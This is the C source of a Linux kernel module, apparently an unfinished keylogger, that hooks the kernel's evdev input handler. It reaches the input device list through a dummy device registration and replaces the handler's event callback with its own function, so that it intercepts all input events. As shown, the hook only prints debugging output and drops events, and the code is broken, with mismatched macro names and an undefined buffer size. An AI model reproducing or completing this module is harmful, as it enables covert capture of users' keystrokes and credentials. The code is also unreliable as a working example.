#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/interrupt.h>
#include <linux/hardirq.h>
#include <linux/kdev_t.h>
#include <linux/slab.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");

#define HANDLE_NAME "evdev"
static DEFINE_SPINLOCK(keylog_lock);
static int buf[BUF_SIZE];
static int ibuf = 0;
static struct file *file = NULL;
static struct input_handler *evdev_handler = NULL;
static void (*old_evdev_event) (struct input_handle *, unsigned int,
		unsigned int, int);

struct evdev {
	int exist;
	int open;
	int minor;
	struct input_handle h;
	/* others */
};

static void new_evdev_event(struct input_handle *handle, unsigned int type,
		unsigned int code, int value)
{
	static int a = 0;
	struct evdev *e = handle->private;
	if (!e)
		printk(KERN_ALERT "no private\n");
	if (a != e->open) {
		a = e->open;
		printk(KERN_ALERT "(%d)\n", a);
	}
//	old_evdev_event(handle, type, code, value);
}

/*
 *	return pointer to input_dev_list	
 */
struct list_head *get_input_dev_list(void)
{
	struct input_dev *tmp_input_dev;
	struct list_head *lh,*node,*prev;

	tmp_input_dev = input_allocate_device();

	/*
	 *	input_register_device add hook_input_dev to
	 *	the tail of input_dev_list like:
	 *	list_add_tail(hook_input_dev->node, &input_dev_list)
	 */
	if (input_register_device(tmp_input_dev) != 0) {
		printk(KERN_ALERT "input register err\n");
		input_free_device(tmp_input_dev);
		return NULL;
	}

	lh = tmp_input_dev->node.next;
	node = &(tmp_input_dev->node);
	prev = lh->prev;

	/*
	 *	We have get input_dev_list.
	 *	So, tmp_input_dev is not used.
	 */
	input_unregister_device(tmp_input_dev);
	input_free_device(tmp_input_dev);

	/*
	 *	Just a verification.
	 */
	if (prev == node)
		return lh;
	else
		return NULL;
}


static int __init keylog_init(void)
{
	struct list_head *input_dev_listp;
	struct input_handle *handle;
	struct input_dev *dev;

	input_dev_listp = get_input_dev_list();
	if (!input_dev_listp) {
		printk(KERN_ALERT "Cannot get input_dev_list\n");
		return -1;
	}

	/*
	 *	look for evdev_handler from every dev in input_dev_list
	 */
	list_for_each_entry(dev, input_dev_listp, node) {
		list_for_each_entry_rcu(handle, &dev->h_list, d_node) {
			if (!handle->handler)
				continue;
			if (strcmp(handle->handler->name, HANDLER_NAME) == 0) {
				evdev_handler = handle->handler;		
				break;
			}
		}
		if (evdev_handler)
			break;
	}

	if (!evdev_handler) {
		printk(KERN_ALERT "No evdev handler\n");
		return -1;
	}

	old_evdev_event = evdev_handler->event;
	evdev_handler->event = new_evdev_event;

	printk(KERN_ALERT "Init ok\n");
	return 0;
}

static void __exit keylog_exit(void)
{
	if (file)
		filp_close(file, NULL);
	evdev_handler->event = old_evdev_event;
	printk(KERN_ALERT "Goodbye kernel\n");
}

module_init(keylog_init);
module_exit(keylog_exit);
